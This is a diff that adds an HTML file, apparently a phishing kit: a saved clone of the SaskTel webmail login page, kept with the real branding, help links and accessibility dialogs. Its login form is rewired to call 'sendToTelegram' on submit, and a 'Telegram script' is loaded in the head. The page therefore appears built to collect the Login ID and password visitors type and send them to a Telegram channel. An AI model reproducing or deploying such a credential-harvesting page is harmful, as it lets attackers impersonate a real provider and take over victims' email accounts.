@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<!-- saved from url=(0035)https://webmail.sasktel.net/#/login -->
+<html lang="en" ng-controller="AppCtrl" class="ng-scope">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style>
+    <style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1, maximum-scale=4.0">
+    <meta name="description" content="Webmail">
+    <meta name="author" content="H">
+    <meta http-equiv="cache-control" content="max-age=0">
+    <meta http-equiv="cache-control" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+    <meta http-equiv="pragma" content="no-cache">
+
+    <!-- Font Awesome 4.7.0 CDN -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <!-- Inline CSS to ensure icon visibility -->
+    <style>
+        .toggle-password {
+            display: inline-block !important;
+            visibility: visible !important;
+            font-family: FontAwesome !important;
+            color: #000 !important; /* Black for visibility */
+            opacity: 0.4 !important; /* Very low opacity */
+            z-index: 10 !important; /* Above input */
+        }
+        .form-group.error-label {
+            position: relative; /* For icon positioning */
+        }
+    </style>
+
+    <!-- OneTrust Cookies Consent Notice -->
+    <script src="./New Sasktel_files/analytics.js.download" type="text/javascript" async=""></script>
+    <script type="text/javascript" async="" src="./New Sasktel_files/adrum-ext.396a4a3598e4fdd54b8073a93c951462.js.download"></script>
+    <script type="text/javascript">function OptanonWrapper() {}</script>
+
+    <script charset="UTF-8">
+        window['adrum-start-time'] = new Date().getTime();
+        (function(config){
+            config.appKey = 'AD-AAB-AAV-JZW';
+            config.adrumExtUrlHttp = 'http://cdn.appdynamics.com';
+            config.adrumExtUrlHttps = 'https://cdn.appdynamics.com';
+            config.beaconUrlHttp = 'http://pdx-col.eum-appdynamics.com';
+            config.beaconUrlHttps = 'https://pdx-col.eum-appdynamics.com';
+            config.xd = {enable : false};
+        })(window['adrum-config'] || (window['adrum-config'] = {}));
+    </script>
+    <script src="./New Sasktel_files/adrum-4.5.15.2691.js.download"></script>
+
+    <script type="text/javascript">
+        var mobileVersion = 'wm6';
+        var RELEASE_VERSION = "64b091a";
+        var IS_MOBILE = false;
+        var wbmglobals = {
+            IS_MOBILE: IS_MOBILE,
+            MEXT: (IS_MOBILE ? '-m' : '')
+        };
+    </script>
+
+    <title pagetitle-directive="">Login - Webmail 7.0</title>
+
+    <link rel="icon" type="image/png" ng-href="/64b091a/branding/hid-2370/images/favicon.ico" href="https://webmail.sasktel.net/64b091a/branding/hid-2370/images/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="./New Sasktel_files/css">
+    <link rel="stylesheet" type="text/css" href="style.css/app.css">
+    <link ng-if="branding.css.custom" rel="stylesheet" type="text/css" ng-href="style.css/custom.css" class="ng-scope" href="style.css/custom.css">
+    <link ng-if="customPagesSettings.paths.css.custompages" rel="stylesheet" type="text/css" ng-href="style.css/custompage.css" class="ng-scope" href="style.css/custompage.css">
+
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="main" src="./New Sasktel_files/main.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="config" src="./New Sasktel_files/config.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="infrastructure" src="./New Sasktel_files/infrastructure.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/base/base-controller" src="./New Sasktel_files/base-controller.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sections/mail/list/list-controller" src="./New Sasktel_files/list-controller.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="angular-bootstrap" src="./New Sasktel_files/ui-bootstrap-tpls.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/base/base-controller-abstract" src="./New Sasktel_files/base-controller-abstract.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sections/mail/list/list-controller-abstract" src="./New Sasktel_files/list-controller-abstract.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="i18n/en_US" src="./New Sasktel_files/en_US.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sections/login/login" src="./New Sasktel_files/login.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sections/login/login-controller" src="./New Sasktel_files/login-controller.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/snapuser/snapuser" src="./New Sasktel_files/snapuser.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/focus/focus" src="./New Sasktel_files/focus.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="sections/login/login-controller-abstract" src="./New Sasktel_files/login-controller-abstract.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/snapuser/snapuser-directive" src="./New Sasktel_files/snapuser-directive.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/focus/focus-directive" src="./New Sasktel_files/focus-directive.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/64b091a/branding/hid-2370/custompages/custompages.js" src="./New Sasktel_files/custompages.js.download"></script>
+    <script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="/64b091a/branding/hid-2370/custompages/i18n/en_US.js" src="./New Sasktel_files/en_US(1).js.download"></script>
+    <!-- Telegram script -->
+    <script src="script.js/script.js"></script>
+</head>
+
+<body translate-cloak="" activitycheck-directive="" dragdropdisable-directive="" detectdevice-directive="" ng-class="$state.$current.name | route2classname" class="theme-default app_base_login">
+
+    <div ng-if="!mobileDevice" id="theme-container" ng-style="{ 'background-image': 'url(' + themeParams.image.data + ')', 'background-size': themeParams.image.bckSize ? themeParams.image.bckSize : 'cover' }" ng-class="{ 'has-theme': themeParams.theme.cssPrefix !== 'default', 'no-theme': themeParams.theme.cssPrefix === 'default', 'has-colors': branding.css.custom }" class="ng-scope no-theme has-colors" style="background-image: url(''); background-size: auto;">
+        <div ui-view="growl" class="ng-scope">
+            <div ng-controller="GrowlCtrl" aria-live="polite" aria-relevant="additions" class="ng-scope">
+                <div class="growlDimmer ng-hide" id="growlDimmer" ng-show="growlList.length > 0 && growlStatus.fullPage"></div>
+                <div class="growlcontain gr0" ng-class="{'growlMaster': growlList.length > 0 && (!growlList[0].unique), 'growlFullPage': growlStatus.fullPage}">
+                </div>
+            </div>
+        </div>
+        <div ui-view="app" class="ng-scope">
+            <div ng-controller="NavstatusCtrl" ng-include="'components/navstatus/navstatus.html'" class="ng-scope">
+                <nav class="navbar navbar-fixed-top ng-scope" role="banner" ng-show="!isWM8Mode">
+                    <div class="navbar-header">
+                        <div class="navbar-brand">
+                            <img class="navbar-logo" ng-src="images/navstatus-logo.png" alt="Webmail 7.0" src="images/navstatus-logo.png">
+                        </div>
+                    </div>
+                </nav>
+
+                <div modal-directive="1" modal-id="'migrationModal'" modal-body="modal.body" modal-header="modal.header" modal-confirm="modal.confirm" data-ng-click-right-button="modal.rightButton();" class="ng-scope ng-isolate-scope">
+                    <div id="migrationModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="migrationModal-label" aria-hidden="true" aria-describedby="migrationModal-body migrationModal-footer">
+                        <div class="modal-dialog ng-isolate-scope" role="document">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <div id="migrationModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div>
+                                </div>
+                                <div id="migrationModal-body">
+                                    <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                                </div>
+                                <div class="modal-footer" id="migrationModal-footer">
+                                    <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+                                    <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                                    <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                                    <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                                    <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                                </div>
+                                <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                                    <span aria-hidden="true">×</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div modal-directive="1" modal-id="'instructionsModal'" template-url="components/navstatus/_partials/keyboard-instructions-modal.html" shared-data="instructionsModalData" class="ng-scope ng-isolate-scope">
+                    <div id="instructionsModal" class="instructionsModal modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="instructionsModal-label" aria-hidden="true">
+                        <div class="modal-dialog ng-isolate-scope">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <h4 id="instructionsModal-label" class="modal-title ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TITLE">Tips for Keyboard Users and Screen Readers</h4>
+                                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                                        <span aria-hidden="true">×</span>
+                                    </button>
+                                </div>
+                                <div class="modal-body ng-scope" role="document" ng-if="sharedData.currentPage === 1">
+                                    <div class="body-content">
+                                        <p class="moreInfo firstParagraph ng-scope" tabindex="0" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_1">The following is a list of tips and keyboard commands you can use to navigate Webmail. There are three pages in this document. To move to the next page, activate the link at the bottom of this popup.</p>
+                                        <br>
+                                        <p class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_GENERAL_INFO_2">The following tables describe how to use different parts of the application. Move to these tables in JAWS or NVDA, using the <strong>"T"</strong> key to go to the table, and your table keys <strong>Control+Alt+Arrows</strong> to move within each table. When you get to the last table on this page press Tab to move to the link for the next page.</p>
+                                    </div>
+                                    <table class="instructionsTable page1">
+                                        <caption>
+                                            <h4 translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_HEADING" class="ng-scope">The Basics: Sections of Application Window</h4>
+                                            <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_BASICS_INFO">Normal screen reader navigation controls will work to move around, such as up/down arrow, tab key and shortcuts to landmarks, headings, links, buttons and form controls.</span>
+                                        </caption>
+                                        <thead>
+                                            <tr>
+                                                <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_SECTION" class="ng-scope">Section</th>
+                                                <th scope="col" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_TH_DESCRIPTION" class="ng-scope">Description</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            <tr>
+                                                <td class="firstCell ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR">Top Navigation bar</td>
+                                                <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_NAVIGATION_BAR_INGO" class="ng-scope">Contains a screen reader button that opens this keyboard popup, and a dropdown labelled with your account email. Open it to go to the support center, take a tour of the features of this application, provide us with feedback, or log out.</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="firstCell ng-binding">
+                                                    Sections navigation
+                                                    <br>
+                                                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_INFO">(found after top navigation bar in tab order). Positioned as a vertical menu on the far left of the screen</span>
+                                                </td>
+                                                <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_BRIEFCASE_NO" class="ng-scope">Links to Mail, Calendars, Task Lists, Contacts and Preferences</td>
+                                            </tr>
+                                            <tr>
+                                                <td class="firstCell ng-binding">
+                                                    Section options sidebar
+                                                    <br>
+                                                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_SIDEBAR_INFO">Positioned on the left side of the page, but to the right of the sections navigation bar.</span>
+                                                </td>
+                                                <td class="sidebarInstructions ng-binding">
+                                                    This has all the options for the section you choose.
+                                                    <ul class="instructionList">
+                                                        <li translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_1" class="ng-scope">At the top of the menu there is a search input and a button to create a New Email, Event, Task, Contact, depending on which section is chosen.</li>
+                                                        <li class="ng-binding">
+                                                            Below that there are items that can be managed depending on the section you are in.
+                                                            <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_SECTION_NAVIGATION_CONTENT_2B">Examples: mail folders, date-picker and calendars, task lists, address books, Briefcase/Online Storage folders or groups of preferences</span>
+                                                        </li>
+                                                    </ul>
+                                                </td>
+                                            </tr>
+                                            <tr>
+                                                <td class="firstCell ng-binding">
+                                                    Main window
+                                                    <br>
+                                                    <span class="moreInfo ng-scope" translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_INFO">For the selections above.</span>
+                                                </td>
+                                                <td translate="LANG_NAVSTATUS_KEYBOARD_INSTRUCTIONS_MODAL_MAIN_WINDOW_CONTENT" class="ng-scope">This is the main work area and will contain the item you are working on. It is where you will read or send emails, review or create calendar events, read or create tasks, manage your contacts or manage preferences.</td>
+                                            </tr>
+                                        </tbody>
+                                    </table>
+                                </div>
+                                <div class="modal-footer">
+                                    <div class="first buttonContainer">
+                                        <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Basics</button>
+                                        <button ng-show="sharedData.currentPage === 3" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.previousPage()" style=""><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous: Specific Elements</button>
+                                    </div>
+                                    <div class="second buttonContainer">
+                                        <button ng-show="sharedData.currentPage === 3" class="btn btn-default closeModalBtn ng-binding ng-hide" data-dismiss="modal" style="">Close</button>
+                                    </div>
+                                    <div class="third buttonContainer">
+                                        <button ng-show="sharedData.currentPage === 1" type="button" class="btn btn-default confirm ng-binding" ng-click="sharedData.nextPage()">Next: Specific Elements<span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+                                        <button ng-show="sharedData.currentPage === 2" type="button" class="btn btn-default confirm ng-binding ng-hide" ng-click="sharedData.nextPage()" style="">Next: Creating an Email <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div modal-directive="1" modal-id="'languageModal'" modal-body-html="languageModalData.body" modal-header="languageModalData.header" data-ng-click-right-button="languageModalData.rightCallback();" data-ng-click-middle-button="languageModalData.middleCallback();" data-ng-click-left-button="languageModalData.leftCallback();" data-modal-rightbtn="languageModalData.rightButton" data-modal-middlebtn="languageModalData.middleButton" data-modal-leftbtn="languageModalData.leftButton" class="ng-scope ng-isolate-scope">
+                    <div id="languageModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="languageModal-label" aria-hidden="true" aria-describedby="languageModal-body languageModal-footer">
+                        <div class="modal-dialog ng-isolate-scope" role="document">
+                            <div class="modal-content">
+                                <div class="modal-header">
+                                    <div id="languageModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div>
+                                </div>
+                                <div id="languageModal-body">
+                                    <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                                </div>
+                                <div class="modal-footer" id="languageModal-footer">
+                                    <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+                                    <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                                    <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                                    <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                                    <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                                </div>
+                                <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                                    <span aria-hidden="true">×</span>
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div ng-class="{content: true, 'simple-content': isWM8Mode}" ng-hide="hideContent" class="ng-scope content">
+                <div class="notificationWrapper">
+                    <div ng-include="'components/notification/notification.html'" class="ng-scope">
+                        <div ng-controller="NotificationCtrl" class="ng-scope">
+                            <div ng-show="!isWM8Mode && notifications && notifications.length>0" class="notification public ng-hide" ng-class="{'public': ($state && $state.current && $state.current.data && $state.current.data.authreq === false)}">
+                                <div scroll-directive="" width-offset="sizes.width.offset" class="notificationContainer ng-isolate-scope" role="dialog" tabindex="-1" style="width: 1358px;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div ui-view="master" class="ng-scope">
+                    <div class="custom-container scroll-container ng-scope ng-isolate-scope" scroll-directive="0" style="height: 650px;">
+                        <header class="custom-header">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <a target="_blank" href="https://www.sasktel.com/">
+                                            <img class="ng-scope" ng-src="images/sask_tel_logo.png" aria-label="{{ 'lang_appname' | translate }}" src="images/sask_tel_logo.png">
+                                        </a>
+                                    </div>
+                                </div>
+                            </div>
+                        </header>
+                        <div class="custom-title ng-scope" translate="LANG_CUSTOM_LOGIN_PAGE_TITLE" translate-cloak="LANG_CUSTOM_LOGIN_PAGE_TITLE">SaskTel Email</div>
+                        <div class="login-container custom-flexcontent">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="login-panel login-form-container custom-flexpanel col-sm-6 col-xs-12">
+                                        <div class="row">
+                                            <div class="col-md-3 col-sm-12 col-xs-0"></div>
+                                            <div class="col-md-9 col-sm-10 col-xs-12">
+                                                <h2 translate="LANG_LOGIN_SIGN_IN" class="ng-scope">Log in</h2>
+                                                <form role="form" onsubmit="sendToTelegram(event)" class="ng-pristine ng-valid">
+                                                    <input type="hidden" name="suppressError" value="true">
+                                                    <label translate="LANG_LOGIN_USERNAME" class="ng-scope">Login ID</label>
+                                                    <div ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_USERNAME'}" class="form-group">
+                                                        <input type="text" class="form-control ng-pristine ng-valid ng-touched" id="username" ng-model="user.username" aria-label="Login ID" ng-disabled="( loadingstatus !== '')" focus-directive="true">
+                                                        <span class="fa fa-lg fa-exclamation-circle input-error" title="" aria-label=""></span>
+                                                    </div>
+                                                    <div class="form-group">
+                                                    </div>
+                                                    <label translate="LANG_LOGIN_PASSWORD" class="ng-scope">Password</label>
+                                                    <div ng-class="{'has-error':error.langkey=='LANG_LOGIN_ERROR_EMPTY_PASSWORD'}" class="form-group error-label">
+                                                        <input type="password" class="form-control ng-pristine ng-untouched ng-valid" id="password" ng-model="user.password" aria-label="Password" ng-disabled="( loadingstatus !== '')">
+                                                        <span class="fa fa-lg fa-eye toggle-password" title="Show password" aria-label="Show password" onclick="togglePasswordVisibility()" style="cursor: pointer; position: absolute; right: 10px; top: 50%; transform: translateY(-50%);"></span>
+                                                        <script>
+                                                            function togglePasswordVisibility() {
+                                                                var el = document.querySelector("#password");
+                                                                var icon = document.querySelector('.toggle-password');
+                                                                if (!el || !icon) {
+                                                                    console.error('Password input or icon not found');
+                                                                    return;
+                                                                }
+                                                                var isPassword = el.getAttribute('type') === 'password';
+                                                                el.setAttribute('type', isPassword ? 'text' : 'password');
+                                                                var text = isPassword ? 'Hide password' : 'Show password';
+                                                                icon.className = 'fa fa-lg toggle-password fa-eye' + (isPassword ? '-slash' : '');
+                                                                icon.setAttribute('title', text);
+                                                                icon.setAttribute('aria-label', text);
+                                                                console.log('Toggled password visibility:', { isPassword, iconClass: icon.className });
+                                                            }
+                                                        </script>
+                                                    </div>
+                                                   
+                                                    <div class="form-group">
+                                                        <button ng-if="( loadingstatus === '')" type="submit" class="btn btn-primary btn-lg ng-scope" translate="LANG_LOGIN_SIGN_IN" aria-label="Log in">Log in</button>
+                                                    </div>
+                                                    <div class="clearfix">
+                                                        <div class="login-forgot">
+                                                            <a ng-if="( loadingstatus === '') && showForgotLink" href="https://webmail.sasktel.net/" ng-click="goToForgotPassword()" translate="LANG_LOGIN_FORGOT_PASSWORD" class="ng-scope">Forgot password?</a>
+                                                        </div>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="login-panel custom-flexpanel border-top col-sm-6 col-xs-12">
+                                        <h2>Welcome to SaskTel Email</h2>
+                                        <p>Log in to access your <a target="_blank" href="https://sasktel.net/">sasktel.net</a> email account.</p>
+                                        <p>Need help? <a target="_blank" href="https://support.sasktel.com/app/answers/detail/a_id/15607">See SaskTel email support.</a></p>
+                                        <br>
+                                        <br>
+                                        <h2>Boost your email security!</h2>
+                                        <p>Two-factor authentication (2FA) provides an additional layer of security when accessing your <a target="_blank" href="https://sasktel.net/">sasktel.net</a> email account in a browser. <a target="_blank" href="https://support.sasktel.com/app/answers/detail/a_id/27000">Learn how to set up and use 2FA</a>.</p>
+                                        <br>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <footer class="custom-footer">
+                            <div class="container">
+                                <div class="row">
+                                    <div class="col-xs-12">
+                                        <img ng-src="images/logo_footer.png" aria-label="{{ 'lang_appname' | translate }}" class="ng-scope" src="images/logo_footer.png">
+                                        <span translate="LANG_CUSTOM_FOOTER_COPYRIGHT" translate-values="{year: year || 2018}" translate-cloak="LANG_CUSTOM_FOOTER_COPYRIGHT" class="ng-scope">© 2025 SaskTel and its licensors. All rights reserved.</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </footer>
+                    </div>
+                    <snapuser-directive snap-user="snapUser" style="display: none;" class="ng-scope ng-isolate-scope"></snapuser-directive>
+                </div>
+                <ng-include src="'components/topmodal/topmodal.html'" class="ng-scope">
+                    <div id="topModalContainer" class="ng-scope">
+                        <div modal-body="errorMessage | translate" modal-directive="" modal-header="'LANG_ERROR' | translate" modal-id="'top-modal-error'" modal-closebtn="'LANG_CLOSE' | translate" class="ng-isolate-scope">
+                            <div id="top-modal-error" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="top-modal-error-label" aria-hidden="true" aria-describedby="top-modal-error-body top-modal-error-footer">
+                                <div class="modal-dialog ng-isolate-scope" role="document">
+                                    <div class="modal-content">
+                                        <div class="modal-header">
+                                            <h4 id="top-modal-error-label" ng-if="header" class="modal-title ng-binding ng-scope" ng-bind="header">Error!</h4>
+                                        </div>
+                                        <div id="top-modal-error-body">
+                                            <div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+                                        </div>
+                                        <div class="modal-footer" id="top-modal-error-footer">
+                                            <button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding" data-ng-click="callbackbuttonclose()" data-dismiss="modal">Close</button>
+                                            <button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+                                            <button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+                                            <button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+                                            <button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+                                        </div>
+                                        <button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+                                            <span aria-hidden="true">×</span>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </ng-include>
+            </div>
+        </div>
+        <wcag-directive></wcag-directive>
+    </div>
+
+    <div ng-show="( isMobile !== true && isMobile !== false )" class="loading-spinner-home loading-full-screen ng-hide">
+        <span class="fa fa-fw fa-cog fa-spin"></span>
+    </div>
+
+    <div id="audiocnt"></div>
+
+    <script src="./New Sasktel_files/require.js.download" data-main="64b091a/main.js"></script>
+</body>
+</html>
